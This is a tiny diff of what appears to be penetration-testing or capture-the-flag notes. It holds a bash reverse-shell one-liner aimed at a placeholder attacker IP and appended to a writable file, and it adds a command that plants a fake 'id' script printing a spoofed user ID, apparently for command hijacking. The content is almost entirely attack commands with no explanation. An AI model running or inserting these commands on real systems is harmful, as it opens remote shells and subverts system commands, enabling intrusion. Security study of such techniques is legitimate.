@@ -1,2 +1,7 @@
 echo "bash -i >& /dev/tcp/<attackerip>/port 0>&1" >> file (having bash written access)
 
+
+--------------------------------------
+
+echo 'echo "uid=1000(user)"' > id
+
